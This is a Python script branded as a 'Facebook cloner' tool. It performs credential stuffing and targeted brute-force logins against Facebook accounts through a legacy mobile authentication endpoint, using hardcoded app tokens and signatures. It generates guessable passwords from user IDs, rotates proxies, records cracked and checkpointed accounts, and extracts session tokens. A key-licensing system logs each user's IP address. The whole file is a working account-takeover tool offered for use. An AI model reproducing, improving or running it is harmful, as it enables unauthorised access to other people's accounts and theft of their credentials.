#!/usr/bin/env python3

# ========================== MAAZ TOOL FINAL EDITION ==========================
# Fixed + Enhanced: Includes license, logging, multithreading, token extractor,
# UID-based password generator, proxy support, and BruteForce module

import os
import sys
import time
import base64
import requests
import subprocess
import random
import string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ========== RICH UI SETUP ==========
try:
    from rich.console import Console
    from rich.panel import Panel
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    class Console:
        def print(self, *args, **kwargs): print(" ".join(str(a) for a in args))
    class Panel:
        @staticmethod
        def fit(content, title=None, border_style=None): return content

console = Console()

TOOL_BANNER = """
[bold cyan]
███╗   ███╗ █████╗  █████╗ ███████╗
████╗ ████║██╔══██╗██╔══██╗╚══███╔╝
██╔████╔██║███████║███████║  ███╔╝ 
██║╚██╔╝██║██╔══██║██╔══██║ ███╔╝  
██║ ╚═╝ ██║██║  ██║██║  ██║███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
[bold green]⚡ MAAZ FACEBOOK CLONER TOOL ⚡[/bold green]
[/bold cyan]
"""
console.print(Panel.fit(TOOL_BANNER, title="💻 Welcome to MAAZ TOOL 💻", border_style="green"))

# ========== CONFIG ==========
GITHUB_USER = "Labbaik757"
REPO_NAME = "MaazTool"
FILE_PATH = "keys/approved_keys.txt"
RAW_KEYS_URL = f"https://raw.githubusercontent.com/{GITHUB_USER}/{REPO_NAME}/main/{FILE_PATH}"
GITHUB_API_URL = f"https://api.github.com/repos/{GITHUB_USER}/{REPO_NAME}/contents/{FILE_PATH}"
GITHUB_TOKEN = "ghp_yourGitHubTokenHere"
HEADERS = {"Authorization": f"token {GITHUB_TOKEN}"}

KEY_FILE = ".maaz_key.txt"
LOG_FILE = "maaz_logs.txt"
COMBO_FILE = "combo.txt"
PROXIES = ["http://144.217.101.245:3129", "http://51.158.68.26:8811"]

# ========== UTILS ==========
def get_random_proxy():
    return {"http": random.choice(PROXIES)}

def generate_passwords(uid):
    return [uid[-6:], uid[-5:], "123456", "112233", "pakistan", "786786"]

def ensure_key_file():
    if not os.path.exists(KEY_FILE):
        key = f"MAAZ-{str(int(time.time()))[-6:]}"
        with open(KEY_FILE, "w") as f: f.write(key)
        console.print(f"\n[bold green]✅ New Key Generated:[/bold green] {key}")

def ensure_required_files():
    required_files = [COMBO_FILE, "OK.txt", "CP.txt", LOG_FILE]
    for file in required_files:
        if not os.path.exists(file):
            with open(file, "w") as f:
                f.write("")
            console.print(f"[bold cyan]📂 Created missing file:[/bold cyan] {file}")

def get_ip():
    try: return requests.get("https://api.ipify.org").text.strip()
    except: return "UNKNOWN"

def log_user_data(key):
    log_line = f"{key} | {get_ip()} | {datetime.now()}\n"
    with open(LOG_FILE, "a") as f: f.write(log_line)

# ========== LICENSE SYSTEM ==========
def fetch_key_list():
    try:
        res = requests.get(RAW_KEYS_URL)
        if res.status_code == 200:
            return res.text.strip().splitlines()
    except: pass
    return []

def clean_expired_keys(lines):
    today = datetime.today().date()
    return [line for line in lines if len(line.split("|")) == 2 and datetime.strptime(line.split("|")[1], "%Y-%m-%d").date() >= today]

def get_file_sha():
    try:
        res = requests.get(GITHUB_API_URL, headers=HEADERS)
        if res.status_code == 200:
            return res.json().get("sha")
    except: pass
    return None

def update_github_key_file(valid_keys, sha):
    try:
        encoded = base64.b64encode("\n".join(valid_keys).encode()).decode()
        payload = {"message": "Auto-clean expired keys", "content": encoded, "sha": sha}
        return requests.put(GITHUB_API_URL, headers=HEADERS, json=payload).status_code == 200
    except: return False

def auto_remove_expired_keys():
    keys = fetch_key_list()
    valid = clean_expired_keys(keys)
    if len(valid) < len(keys):
        sha = get_file_sha()
        if sha: update_github_key_file(valid, sha)

def check_key_approval(local_key, key_list):
    for line in key_list:
        try:
            key, expiry = line.strip().split("|")
            if key == local_key and datetime.strptime(expiry.strip(), "%Y-%m-%d").date() >= datetime.today().date():
                return True
        except: continue
    return False

# ========== TOKEN EXTRACTOR ==========
def extract_token():
    email = input("Email/UID: ")
    pwd = input("Password: ")
    headers = {"User-Agent": "Mozilla/5.0"}
    data = {
        "email": email,
        "pass": pwd,
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "format": "json",
        "sdk_version": "2",
        "generate_session_cookies": "1",
        "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"
    }
    try:
        res = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers)
        if "EAAA" in res.text:
            token = res.json().get("access_token")
            console.print(f"[green]✅ Token: {token}[/green]")
        else:
            console.print("[red]❌ Failed. Check credentials.[/red]")
    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")

# ========== MULTITHREAD CLONING ==========
def facebook_login(uid, password):
    try:
        session = requests.Session()
        proxy = get_random_proxy()
        headers = {"User-Agent": "Mozilla/5.0"}
        data = {
            "email": uid,
            "pass": password,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "format": "json",
            "sdk_version": "2",
            "generate_session_cookies": "1",
            "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"
        }
        r = session.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers, proxies=proxy)
        if 'session_key' in r.text:
            with open("OK.txt", "a") as f: f.write(f"{uid}|{password}\n")
            console.print(f"[green][OK] {uid}|{password}[/green]")
        elif 'www.facebook.com' in r.text:
            with open("CP.txt", "a") as f: f.write(f"{uid}|{password}\n")
            console.print(f"[yellow][CP] {uid}|{password}[/yellow]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

def start_cloning():
    path = COMBO_FILE
    if not os.path.isfile(path):
        console.print(f"[red]File not found: {path}[/red]")
        return
    with open(path, "r") as f:
        lines = [x.strip() for x in f if "|" in x]
    with ThreadPoolExecutor(max_workers=5) as ex:
        for line in lines:
            try:
                uid, pwd = line.split("|")
                ex.submit(facebook_login, uid, pwd)
            except: continue

# ========== BRUTEFORCE TARGET UID ==========
def brute_force():
    target = input("🎯 Enter UID/email: ")
    pwds = generate_passwords(target)
    with ThreadPoolExecutor(max_workers=4) as ex:
        for pwd in pwds:
            ex.submit(facebook_login, target, pwd)

# ========== MAIN ==========
def main():
    ensure_key_file()
    ensure_required_files()
    with open(KEY_FILE) as f:
        key = f.read().strip()

    if GITHUB_TOKEN == "ghp_yourGitHubTokenHere":
        console.print("[red]❌ GitHub Token placeholder! Update it.[/red]")
        return

    auto_remove_expired_keys()
    keys = fetch_key_list()
    if check_key_approval(key, keys):
        log_user_data(key)
        console.print("\n[green]✅ Key approved! Starting...[/green]")
        start_cloning()
        extract_token()
        brute_force()
    else:
        console.print("[yellow]⏳ Key not approved or expired.[/yellow]")

if __name__ == "__main__":
    main()
